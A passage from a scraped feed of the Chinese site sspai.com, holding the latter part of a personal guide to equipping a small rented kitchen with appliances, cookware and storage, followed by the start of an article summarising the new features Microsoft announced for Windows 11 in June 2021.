当时还没尝试「宝宝粥」模式</figcaption></figure><ul><li><strong>缺点：</strong></li></ul>\n<ol>\n<li>\n<strong>二次加热时下气巨慢，需要手动放气。煮粥为了更烂，我会采取二次加热。</strong>但只要是液体，下气的时候粥会从排气口飞溅（扶额），很难清理；</li>\n<li>\n<strong>产品的一些间隙难清理</strong>。锅和内胆之间的缝隙以及锅后面的凹槽等，存在难清理的角落。</li>\n</ol>\n<p>综上，电高压锅作为必备选项，我认为在选购时可以参考几个条件：</p>\n<ol>\n<li>小容量 2.5L（1-3人）；</li>\n<li>功能面板简单好上手；</li>\n<li>具备煮饭煮粥煮汤的基本功能；</li>\n<li>可预约可保温；</li>\n<li>好清理。</li>\n</ol>\n<h3><strong>02 微波炉 |「速食利器」</strong></h3>\n<blockquote><p>有微波炉在，甚至不用开火了。</p></blockquote>\n<p>微波炉一直是爸妈家里常年必备。想必不用多说，同样是生活中不可或缺的小家电之一。尤其在回蒸旧菜，加热早餐，下班只想吃一个加热 4 分钟即可获得的方便芝士炒年糕时，你就会感叹微波炉之妙。</p>\n<p>由于租的房子没有配备微波炉，于是我以<strong>「只要具备微波炉基本加热功能」</strong>为目标，入手了一台。（后来发现公司的微波炉也是同款。）</p>\n<figure class=\"ss-imgRows\" figcaption=\"美的微波炉 M1-L213B 21升  | 参考价：299RMB | 我把微波炉放在冰箱上\"><img src=\"https://cdn.sspai.com/2021/06/07/147784739c891c4d1ba46b28ebde3183.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/07/b8c4caf0b8db5912aa966c79d339595a.jpg\" alt=\"\"></figure><p> </p>\n<p>个人认为如果<strong>只是租房或者不追求微波炉太强的功能，可以选择这样的「转盘式」的最朴实的款式，价位大约在 250-450RMB 区间，</strong>选择的空间挺大。转盘清理也很方便。（高端款的微波炉可以配置蒸锅，实现蒸鸡蛋、蒸包子的功能，普通微波炉千万不要用来直接加热鸡蛋，会爆炸哦。）</p>\n<p>在没买微波炉前，每天用小奶锅来煮牛奶，由于早上洗漱紧张没时间一直盯着火，所以无一例外每次都熬不过牛奶沸腾之后扑出来的结果。</p>\n<p>微波炉对于上班族还是非常友好，我的使用频率几乎是每天。譬如早上 1 分钟低火加热一下牛奶。冬天做好的菜凉的太快，可以用微波炉回温。下班用 3 分钟中高火加热一下晚餐。</p>\n<p>加之现在诸多速食半成品的熟食，都可以直接用微波炉实现加热。</p>\n<p>上述是我认为必备的2个小家电，除此之外再介绍必备的厨具。</p>\n<h3><strong>03 一口炒锅 |「不粘锅」or 「铁锅」</strong></h3>\n<p>购买其一即可。在这里只有一个建议：<strong>懒人不要买铁锅。</strong>（真诚的目光）</p>\n<p>事情源于，在妈妈不断念叨「铁锅炒菜香」之下，我开心的购买了一个铁锅。并查阅了相关资料，<strong>铁锅非常需要保养</strong>，比如需要一块肥肉开锅。买了一块很贵的肥猪肉准备开锅。</p>\n<p>紧接着，肥猪肉尚未下锅。我好朋友给我寄了一口她觉得非常好用的「不粘锅」，我顺理成章地用上了。现在属于「用不粘锅烹炒万物」的状态。</p>\n<p>事情的结局是——那块肥猪肉还躺在冰箱里冰冻层里 ;D。</p>\n<figure class=\"ss-imgRows\" figcaption=\"不粘锅烹炒万物 | Tronyoo 麦饭石不粘锅 | 参考价：199RMB\"><img src=\"https://cdn.sspai.com/2021/06/04/5cf33bd52c9be46721a26408a0d359ea.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/04/583053ab9c0ce5430aa3611bb614d43f.jpg\" alt=\"\"></figure><p>在这里梳理一下两种炒锅的优缺点，供大家参考。</p>\n<h4><strong>「铁锅」</strong></h4>\n<ul><li><strong>优点：</strong></li></ul>\n<ol>\n<li>炒菜更香；</li>\n<li>炒菜可以用铁锅铲；清洁时可以用钢丝球；</li>\n<li>有利于人体对铁物质的吸收（我妈说的）。</li>\n</ol>\n<ul><li><strong>缺点：</strong></li></ul>\n<ol>\n<li>需要开锅，开锅后需要用心保养；</li>\n<li>相对较重（女生单手吃力）；</li>\n<li>新手可能糊锅。</li>\n</ol>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/04/d5d015436768d6f9b75586a38fe6d4e0.jpg\"><figcaption>不粘锅烹煮万物之 <strong>「</strong>意式肉酱面<strong>」</strong></figcaption></figure><h4><strong>「不粘锅」</strong></h4>\n<ul><li><strong>优点：</strong></li></ul>\n<ol>\n<li>重量轻，可以单手拿；</li>\n<li>炒菜不沾，新手友好（尤其是煎鸡蛋等）；</li>\n<li>颜值高。</li>\n</ol>\n<ul><li><strong>缺点：</strong></li></ul>\n<ol>\n<li>不粘锅涂层可能对人体有害；</li>\n<li>必须使用硅胶铲或者木铲。</li>\n</ol>\n<h3><strong>04  汤锅 / 蒸锅一体 |「健康餐必备」</strong></h3>\n<p>作为口味清淡的两广人，有两个需求。<strong>第一，能煮汤（还有螺蛳粉）。第二，基于少有少盐的考虑，我经常水煮青菜。尤其是在追求健康餐的前提下，蒸玉米、红薯则是必备。</strong></p>\n<p>如果你也是这样，那么汤锅和蒸锅则是你的必备。然而我在这个选项上走了弯路。家里一共上三个锅，<strong>一个小奶锅（含蒸格）、一个大蒸锅、一个大汤锅，实际上它们完全可以是一个锅。</strong></p>\n<p>我购入的三口锅，正好说一下他们各自特点：</p>\n<ul><li>\n<strong>16cm 的小奶锅</strong>：尺寸迷你，方便，使用频率 top 1 —— 方便且适合蒸一人食的包子、鸡蛋，以及煮一人食的面条或者汤粥。但对于紫薯、红薯，有点难蒸透，水甚至会烧干。粽子、玉米等稍微大的食物放不下。</li></ul>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/04/58111d41f20a8f2d5c2b6c01cddd73da.jpg\"><figcaption><strong>九阳小奶锅 16cm</strong> | 参考价：59 RMB（带蒸格） </figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/04/089722ed38cf1bfa3643fba690c2c11d.jpg\"><figcaption>简直是为<strong>「一人食」</strong>量身定做 | 煮螺蛳粉、煮泡菜饺、蒸小笼包、蒸小红薯</figcaption></figure><ul><li>\n<strong>24cm 的蒸锅</strong>：尺寸大，适合蒸玉米、香肠、红薯、粽子且可以同时蒸；去掉蒸格，也可以是汤锅。</li></ul>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/04/48a10c5d0f2b945006bec48f64a5b238.jpg\"><figcaption><strong>华帝 304 不锈钢蒸锅二层 24cm</strong> | 参考价：66RMB</figcaption></figure><ul><li>\n<strong>22cm 的汤锅</strong>：只能煮汤，尺寸过大，鸡肋。如果要丢弃一个锅，我会把它扔掉。</li></ul>\n<p><strong>综上，</strong></p>\n<p><strong>如果只要一个锅，我的建议是：</strong>一个 20-22cm，蒸锅汤锅一体（二层），下面煮汤，上面蒸，足够放进一个玉米。</p>\n<p><strong>如果可以接受两个锅，我的建议是：</strong>一个带蒸锅的小奶锅，建议尺寸 16-18cm，很方便。可以早餐蒸几个小包子、鸡蛋。一个带蒸格的汤锅，建议尺寸 20-22cm, 煮汤以及蒸大的食物。</p>\n<h2>碗碟与刀具</h2>\n<h3>01 碗和碟</h3>\n<p>众所周知，买碗和杯子就像上学时买好看的本子一样，各个爱不释手就逃不开被闲置的命运。且由于空间限制的问题，<strong>在购买厨房餐具、杯具时要适度，尽量有计划地购买。</strong></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/07/82a706295440aa9c9b6a4e9d48b42cc6.jpg\"><figcaption>目前家里买的碗碟 | 置物架已经饱和</figcaption></figure><p>以我举例：可以用「<strong>用来做什么 + 需要几个</strong>」来辅助思考。</p>\n<p>用来盛米饭等日常用的小碗 x 4</p>\n<p>用来盛汤、汤面、盛粥 x 2</p>\n<p>用来盛菜的盘子x 4</p>\n<p>……</p>\n<p>碗和碟子还是以个人喜好为主，毕竟自己觉得好看的碗碟，吃起来才会心情愉悦，这里给大家要强调尺寸的重要。众所周知，碗越大，吃的越多。</p>\n<ul>\n<li>「吃饭的小碗」：5 寸以内即可；</li>\n<li>「装菜的碟子」：不宜过大，16-20cm 即可，尽量有深有浅，深碟可以放汤汁多的菜。（家里买的 20、22cm 对我来说已经蛮大了。）</li>\n</ul>\n<figure class=\"ss-imgRows\" figcaption=\"家里的一些碗碟 ｜ 小碗均为 5 寸\"><img src=\"https://cdn.sspai.com/2021/06/08/9f26f88712c1350e58d18b47f2219763.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/08/978ab5f3f0f6aa1e2ddd22bef0d9e25a.JPG\" alt=\"\"></figure><figure class=\"ss-imgRows\" figcaption=\"左图蓝色深碟 20cm｜ 白色小碟 18cm｜右图花纹大碟 22cm\"><img src=\"https://cdn.sspai.com/2021/06/08/576a392aed98d7aae658a8dcbafed5b7.JPG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/08/96f1b5d001bf40264e67bae33b081990.JPG\" alt=\"\"></figure><p>除此以外，这里推荐一个<strong>「泡面碗」</strong>，使用率很高。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/07/f8e49a44c8f1b0b5321c65e113ee915f.jpg\"><figcaption><strong>泡面碗</strong>  | <strong>7寸</strong>直耳 | 双耳防烫，大容量适合盛一人份的面、汤、粥均可，还可以放超市买的小烤鸡</figcaption></figure><h3>02 刀具</h3>\n<p>因为不苛求刀具，我直接购入了一整套，一共有 7 件。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/08/7ce2f142f599d230bc47e638ad919cc4.jpg\"><figcaption>炊大皇刀具 ｜ 参考价：119 RMB</figcaption></figure><p>经过使用后，<strong>个人认为如果必备的有 4 把刀：切片刀（大刀用来斩切大块的肉类）、三德刀（可以切肉片或者蔬菜水果）、水果刀、厨房剪。</strong></p>\n<hr>\n<h2>好用但容易遗忘的好物</h2>\n<h3>01 一根很长的筷子</h3>\n<p>煎炸防烫，怕被油溅星人福音。每次煎鸡翅下锅时，真的是恨不得自己离灶台五米远。</p>\n<p>购入了一双 42cm 的超长筷子，非常喜感，但是有种玩黑科技的爽感。</p>\n<figure class=\"ss-imgRows\" figcaption=\"42cm 超长筷子 米木日式家居 |  参考价： 2.4 RMB | 左图为在同事家煎鸡翅\"><img src=\"https://cdn.sspai.com/2021/06/07/5c54d04a908e0b18e2e7701b1304274c.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/07/05e3109c0ae8772b8822e2026880d4e2.jpg\" alt=\"\"></figure><h3>02 硅胶食品夹</h3>\n<p>对我而言的万能硅胶夹，怕烫星人必备，可以用来夹各种烫的食物。比如，刚出锅的玉米，刚出锅的粽子，甚至直接用来夹蒸架。</p>\n<p>还能用来搅拌意面和肉酱。</p>\n<figure class=\"ss-imgRows\" figcaption=\"硅胶食品夹 | 参考价：9.9 RMB | 可用来搅拌意面和芝士碎\"><img src=\"https://cdn.sspai.com/2021/06/07/65f120eabb4425d0d5e0d7838a636819.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/07/81d47b490d5dd82d71cce26dd929c151.jpg\" alt=\"\"></figure><h3>03 平平无奇的刷碗海绵 </h3>\n<p>因为家里的锅是不粘锅，而且电高压锅内胆和奶锅都不能用钢丝刷，所以我家里清洁均是使用海绵擦。<strong>绿色的一面比较粗糙，很适合刷锅。</strong></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/07/071af9cadb2516fa66b98e791799f17d.jpg\"><figcaption>刷锅海绵擦 | 参考价：3.6 RMB / 5个</figcaption></figure><h2>厨房收纳大法好</h2>\n<h3>01 冰箱磁铁置物架</h3>\n<p>这可能是厨房里我买的最成功的置物架了，完全节省了我厨房的空间，吸附力巨强，油盐酱醋都可以塞下。配合下述 02 置物架，简直完美。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/07/236984c4f71c82a12f9951d5f22a86e1.jpg\"><figcaption>鹿谷川 日式冰箱挂架 | 参考价：70 RMB </figcaption></figure><h3>02 移动置物架</h3>\n<p>移动置物架在上图 01 的下方，我用来放置大瓶的酱油、耗油等酱料，下面两层放小的奶锅、汤锅。置物架正好弥补了冰箱和灶台之间的空隙，可以说是完美利用空间了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/08/bed80d40e37e697c394294eeb1582011.png\"><figcaption>美厨 厨房移动置物架 | 参考价：119 RMB </figcaption></figure><h3>03 调味罐收纳</h3>\n<p>下面这个调味料罐收纳也在上图 01 中展示了，非常契合地放在了冰箱挂架最上方（简直就是一套）。我用来放盐、糖和鸡精，三个比较常用的调味料，内置小勺子。厨房必备，千万不要直接用袋子倒盐，否则容易导致手抖造成齁咸的惨剧。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/08/8c1fe6314271ecb141f80966ac4a0a45.jpg\"><figcaption>米木日式家居 调味罐3个组合装 | 参考价：37 RMB</figcaption></figure><h3>04 沥水架 &amp; 置物架</h3>\n<p>沥水架是厨房必备的收纳，也是增加幸福感的小物件。建议在购买前测量一下尺寸，以免不合适。</p>\n<figure class=\"ss-imgRows\" figcaption=\"鹿谷川 双层碗碟沥水架 |  参考价：75 RMB | 适合1-3人生活厨具\"><img src=\"https://cdn.sspai.com/2021/06/07/05155ddde0f3a816bb9ad9aa1a25f02c.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/07/b9b31140d24c8bb2b3593080a919c2b4.jpg\" alt=\"\"></figure><h3><strong>05 密封米桶</strong></h3>\n<p>购入了大号的米桶，因为容量太大，一个人没必要放满一缸米。所以我把所有五谷杂粮都放进去了。</p>\n<figure class=\"ss-imgRows\" figcaption=\"米木日式家居 米桶大号 |  我把五谷杂粮都放进去了\"><img src=\"https://cdn.sspai.com/2021/06/08/14452c5d4df084d34c4836ea03271d8c.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/08/db0ed5ee2899636c47e2394c92ce3401.jpg\" alt=\"\"></figure><h2>那么问题来了：我不会做饭啊</h2>\n<p>可以说一个人生活之前，对于做饭还是一无所知。每次回家，在老妈的厨房里燃起做饭的热情跃跃欲试时，都会被老妈浇灭。</p>\n<p><strong>厨房已经布置完毕，万事俱备，只欠一身厨艺了。</strong></p>\n<p>也是在朋友们的推荐下，下载了 <strong>「懒饭」「下厨房」</strong> 两个APP，已经可以满足我家常菜的需求了。</p>\n<ul><li><a href=\"http://vcook.xiachufang.com/\" target=\"_blank\">「懒饭」</a></li></ul>\n<ol>\n<li>有各类合集和排行，适合选择困难星人。</li>\n<li>小视频的形式，言简意赅，上手很快。</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/08/4bfebbcb1f5ef1f56488bc6ae3c4e770.JPG\"><figcaption>懒饭｜适合选择困难星人，打开排行，看见哪个就做哪个</figcaption></figure><ul><li><a href=\"https://www.xiachufang.com/\" target=\"_blank\">「下厨房」</a></li></ul>\n<ol>\n<li>可以搜索任何自己想做的菜的菜谱。</li>\n<li>很多网友们上传的菜谱，更接地气儿。</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/08/eac5bdb3afe058922db7242293fb7773.JPG\"><figcaption>下厨房｜我常用来搜索菜谱</figcaption></figure><p>上班之前，我还是个不下厨房的小白，如今虽然还做不成硬菜，也还是能喂饱自己了。:D</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/08/b88e7e1168ea274941d6e5b67b38a3e4.jpg\"><figcaption>吃肉吃肉</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/08/cf852719f30a5d212e6fff21e3a130ef.jpg\"><figcaption>带去公司的便当</figcaption></figure><p>写的很琐碎，但是也算全面了。<strong>希望本篇文章能够帮助到即将毕业开启人生新篇章的小伙伴，以及看完文章想马上开启厨房新篇章的朋友们！</strong></p>\n<p>注：文中产品图片均源于淘宝、京东店铺，产品仅作参考使用，不包含本人任何推广意愿，其余照片均为作者拍摄。</p>\n<p><strong>关联阅读</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/67301\" target=\"_blank\">打造一份营养早餐，你可以从这些方面下手</a></li>\n<li><a href=\"https://sspai.com/post/64109\" target=\"_blank\">食材简单 A+B，属于工作日的一锅流</a></li>\n<li><a href=\"https://sspai.com/post/62184\" target=\"_blank\">做饭半年，995 码农如何做到自备每日工作餐</a></li>\n<li><a href=\"https://sspai.com/post/61750\" target=\"_blank\">料理时间大缩减，用这些美味半成品给自己加个餐</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67012"},{"title":"Windows 11 要更新了，这些变化能让你心动吗？","date":"2021-06-25 06:30:00","description":"\n<p>6 月 24 日晚，微软通过线上发布会正式公布了自家的下一代桌面操作系统更新，此前预热已久但不幸泄露的 Windows 11 也终于来到了大家面前。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/67328\" target=\"_blank\">这就是下一代的 Windows？Windows 11 泄露版上手体验</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/0d68284ad5d0541f96c8237b8b066c57\"></figure><p>如果不考虑泄露版，这次 Windows 11 作为 6 年来的首次大更新还是带来了不少可圈可点的更新看点，无论是外观设计到交互体验再到软件、游戏体验都有不少值得期待的地方。</p>\n<p>本文根据微软发布会上公布的相关视频及图片资料整理了大部分 Windows 11 的更新内容，希望能为你提供一些参考。</p>\n<p><strong>注：发布会视频及图片的展示内容与最终的实际体验可能会有差异。</strong></p>\n<h2>加入圆角与色彩潮流，还有新的开始菜单</h2>\n<p>相比 Windows 10，Windows 11 最直观的变化自然在外观设计。</p>\n<p>和泄露版展示的体验一样，Windows 11 将任务栏图标进行了居中处理。默认的任务栏图标包括开始菜单、搜索、桌面切换以及小组件（Widgets），开始菜单图标采用了与 Windows 11 相符的新设计，位置则依然在最左侧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/7946ac6ab2f8621e38bcfaf003fa54bd.png\"><figcaption>新版任务栏布局</figcaption></figure><p>新版开始菜单正式弃用了「动态磁贴（Live Tiles）」这一标志性设计，没了大色块、直角和框线，布局更加清爽；结合宣传视频展示的内容和泄露版的现有体验，开始菜单除了允许用户固定常用 App 到面板中上部分，还会在面板下方提供应用和最近使用过的文档建议；老用户熟悉的所有应用列表入口则在面板右上方。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/6bb21bf43b496ca2620779059def6551\"><figcaption>新版开始菜单</figcaption></figure><p>从任务栏和开始菜单也不难看出，微软也将在 Windows 11 中启用一套全新的默认图标，这与微软今年对 Windows 图标的翻新工作可以说是一脉相承的。而除了这些我们在泄露版中已经体验过的内容，本次发布会公布的宣传视频中也给出了大量设计翻新细节，比如新版系统设置、新的主题系统、暗色模式等等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/7fecdd4c192aaf23e10d138f2de21cfb\"><figcaption>新版系统设置</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/2a8d47417f5510e4d97c6806a2abff73\"><figcaption>新的主题系统</figcaption></figure><p>值得一提的是，在发布会后上传的 <a href=\"https://www.youtube.com/watch?v=g7y1S3wIysg\" target=\"_blank\">Watch how Windows 11 is being designed </a>视频中，微软还提到了 Windows 11 的整体设计理念变迁，包括对字体的重新设计（主要指不久前更新的 <a href=\"https://blogs.windows.com/windows-insider/2021/05/06/announcing-windows-10-insider-preview-build-21376/\" target=\"_blank\">Segeo UI 可变英文字体</a>），圆角、层次和阴影的运用，壁纸的动态，材质的模拟……以及色彩提取，没错，说到主题系统，最有意思的是和 Android 12 的 Material You 类似，Windows 11 也有一套能够从壁纸中取色并应用在系统 UI 中的主题系统，那个在视频中一闪而过的新版资源管理器就用到了这种取色方案。</p>\n<figure class=\"ss-imgRows\" figcaption=\"新版资源管理器\"><img src=\"https://cdn.sspai.com/2021/06/25/58648f8cc682a55232dc741eccd9425f.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/25/f46202267552b4e1607a16299a21efb9.jpg\" alt=\"\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/341507f2d708f7013c9ea53354a51e26\"><figcaption>全局主题</figcaption></figure><p>至于圆角，Windows 开发团队认为圆角的引入更加适合触屏交互形态，配合适当的色彩，也更能给人一种温润、柔软的可触碰感。除了 Windows 11 操作系统，我们在 Edge、Office 等微软自家应用中应该也能看到越来越多的圆角设计。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/6e095fefcfcc8076a6847e2fcd0d34a3\"><figcaption>Edge 与 Office 的圆角设计</figcaption></figure><h2>PowerToys 部分失业，多任务处理更方便</h2>\n<p>交互体验的改进是本次 Windows 11 的更新重点。</p>\n<p>贴靠布局（Snap Layouts）迎来了新的呈现形式，相比于 Windows 10 的需要依赖鼠标在显示器边缘触发，Windows 11 将方式重新整合进了最大化窗口按钮中。当我们把鼠标悬浮在最大化窗口按钮上时就可以看到各种贴靠方式，方便随时调用和排布。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/5d0c0e4405c80c985b70a12259effe56\"><figcaption>新的贴靠布局</figcaption></figure><p>Windows 11 的贴靠分组（Snap Groups）也会记住我们使用了哪些应用程序，还会将它们的贴靠布局记录下来。最典型的场景就是当前的工作被即时通讯消息打断了，依靠贴靠分组功能我们只需要再点击一次就能回到之前的应用和布局，继续推进工作。</p>\n<p>这个功能看起来很像是 Windows 10 中跳票多年的 Sets，也像是我们此前多此推荐过的 PowerToys 迎来了一次「转正」。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/56719\" target=\"_blank\">微软出品的窗口管理工具，还能让你不再苦记快捷键：PowerToys</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/b7db2e9818a8e2b9efc8cf2724d10687\"><figcaption>贴靠分组功能可以快速回到之前的布局</figcaption></figure><p>更值得称道的是，Windows 11 中贴靠分组功能不仅会记住当前显示器的贴靠布局，还会记住所有外接显示器的贴靠布局。当我们重新将笔记本接到外接显示器上时，贴靠分组会自动还原之前的贴靠布局——在正确的显示器上打开对应的窗口，方便我们重新开展工作。微软还表示贴靠分组功能可以配合虚拟桌面使用，方便用户并行处理多个场景的任务。</p>\n<p>最后，Windows 11 还针对平板电脑以及其他触摸设备做了不少额外改进：断开物理键盘后，所有任务栏图标间距会自动增加，以适应更大的触摸范围并提供一定的视觉提示；Windows 11 还将把触摸板手势带到触摸屏上，带给用户更统一的触摸体验。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/79d7f6a8bfaf6f6169d307ac243d1174.png\"><figcaption>Windows 11 也将针对触摸体验进行优化</figcaption></figure><h2>全新应用商店，内置 Android 应用</h2>\n<p>比起外观和交互上的变化，Windows 11 的软件体验改进则可谓重磅。</p>\n<p>微软对 Windows 11 内置的 Microsoft Store 软件商店进行了架构上的重构，未来应用商店里除了包含 Windows 10 上已有的 UWP 应用外、也将支持上架 win32 应用甚至是 Android 应用。这当中有两个值得关注的点：</p>\n<p><strong>首先是应用商店政策</strong>。微软表示新版应用商店允许开发者自选结算系统，通过这种方式从商店中获取的收益将全数归开发者所有，微软不会进行任何抽成（后续微软也向 The Verge <a href=\"https://www.theverge.com/2021/6/24/22549222/microsoft-store-developers-windows-11-revenues-games\" target=\"_blank\">证实</a> 这一策略不适用于游戏）；如果开发者采用微软提供的结算系统，所得收入的抽成比例则会是 15%（应用）和 12%（游戏），比起 App Store 和 Google Play 依然可谓「实惠」。</p>\n<p><strong>另一方面，Windows 11 将原生支持运行 Android 应用</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/f7560cefc0da1475a097220068312fcd\"><figcaption>新版应用商店</figcaption></figure><p>完全重塑一个自己的 Android 应用商店并不现实，所以在新版软件商店中，Android 应用的分发将依靠亚马逊应用商店，微软软件商店则负责内容展示；不过 Android 应用运行起来并不需要 Android 系统环境，可以和当前的 Windows 桌面环境完美适配，比如可以将应用固定在任务栏上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/544ac7fa88ecfd7bd56deb477c837932\"><figcaption>运行抖音 Android 版的 Windows 11</figcaption></figure><p>唯一的限制是 Windows 11 中的 Android 应用显然没有 Google Play 框架可以依赖，Google 系的应用以及一些需要 Google Play 服务的应用在 Windows 11 上可能无法正常工作。</p>\n<p>借助开源的 Android 生态，微软似乎想「补全」其生态中一直缺失的重要一环 —— 也就是移动端。其实从 Apple 开始让 macOS 运行 iPadOS 应用就不难看出，未来桌面系统和移动系统的差别会越来越小，并且最终很有可能趋同、融合成同一个操作系统。</p>\n<p>除了应用商店，Windows 11 也将 Skype 淡出舞台并默认内置了 Microsoft Teams 作为沟通应用。和搜索、多任务处理类似，Teams 在 Windows 10 中甚至拥有一个独立的任务栏图标位置，点击任务栏图标即可快速开启 Teams 聊天面板；微软似乎想为 Windows 11 打造一个「Facetime」，而 Teams 这款既可以用在家庭、也可以用在商务办公领域的效率协作工具，就再适合不过了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/8f8c85194e8029362d176e003dababf6.jpg\"><figcaption>直接与 Windows 11 任务栏集成的 Microsoft Teams</figcaption></figure><p>最后，此前已经向 Windows 10 用户全量推送的「资讯和兴趣」面板在 Windows 11 中也进一步进化为独立的小部件（Widgets）功能，也就是新版任务栏中开始菜单右侧的第三个图标。从微软给出的演示来看，小部件面板除了展示用户关心的资讯卡片，还支持用户固定一些自己常用的 app 小部件，如微软待办、OneDrive、Edge 必应搜索等等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/e6892ae86ee47858d33a6248fb908ef5.jpg\"><figcaption>小组件面板</figcaption></figure><h2>Xbox 技术下放，画质更好、加载更快</h2>\n<p>除了效率与沟通，游戏也是 Windows 11 的主打体验之一。在这里，坐拥 Xbox 游戏主机的微软可以说是来了一次全面的技术下放。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/ee913235124bf8c85cb4d152c258ea70.png\"><figcaption>左：正常游戏画面；右：自动 HDR 画面</figcaption></figure><p>比如此前为 Xbox Series X|S 独占的 Auto HDR 技术，在 Windows 11 中，只要游戏基于 DirectX 11 及以上版本开发，就能自动应用来自 Auto HDR 的画质升级，带来更宽广的动态范围和色彩质感。</p>\n<p>与之类似的，Xbox Series X|S 上那套全新的读写系统 —— DirectStorage 技术也将下放至 Windows 11。DirectStorage 能够减少游玩过程中后台材质串流所需要的读写性能需求，进而允许系统将 CPU 算力合理分配到图形、NPC 加载等其他任务上去，减少游戏加载时间并提升游戏体验。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/62570248643cf05b65e695602f8f7449.png\"><figcaption>GPU 直接可以从 NVMe 中读取素材，图源：Nvida</figcaption></figure><p>目前微软官方已在 Windows 11 <a href=\"https://www.microsoft.com/zh-cn/windows/windows-11-specifications\" target=\"_blank\">规格</a> 界面展示了 DirectStorage 和 Auto HDR 的具体硬件需求：DirectStorage 功能需要 NVMe SSD、使用「标准 NVM Express 控制器」驱动程序和支持 Shader Model 6.0 的 GPU；Auto HDR 则仅需一台支持 HDR 的显示器。</p>\n<p>此外微软还提到了一个名为「专为 DirectStorage 优化（DirectStorage Optimized）」的 Windows 11 PC 认证，这些设备估计可以开箱即用，直接享受到 DirectStorage 带来的游戏体验提升。</p>\n<p>最后，Windows 11 也将搭载全新的 Xbox 客户端，允许用户通过 Xbox Game Pass 享受到来自微软的庞大游戏阵容；订阅了 Xbox Game Pass Ultimate 的用户还能通过 Xbox app 进行 Xbox 云游戏串流。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/fb98206a301100b09cc407651ec40a83.jpg\"><figcaption>Xbox Game Pass for PC</figcaption></figure><p><strong>参考链接：</strong><a href=\"https://news.xbox.com/en-us/2021/06/24/windows-11-the-best-windows-ever-for-gaming/\" target=\"_blank\">Windows 11: The Best Windows Ever for Gaming - Xbox Wire</a></p>\n<h2>点评 &amp; 升级指南</h2>\n<p>Windows 11 的确是一次大更新，但整合版 Teams 在国内的网络表现，新版商店在国内应用商店审查策略下的最终体验，背靠 MSN 中文网低质量资讯来源的 Widgets……将这些部分刨除之后，它对大部分国内 Windows 用户来说就更像是一次界面与交互的更新了。</p>\n<p>而国内 Windows 用户对界面与交互的变化向来不怎么买账。</p>\n<p>如果你想尝鲜，下周一（6 月 28 日）开始就可以通过 Windows Insider 开发者预览计划的 Dev 通道体验到 Windows 11 测试版了，我们也将在第一时间上手进行体验；正式版预计将于 2022 年初推出，符合条件的 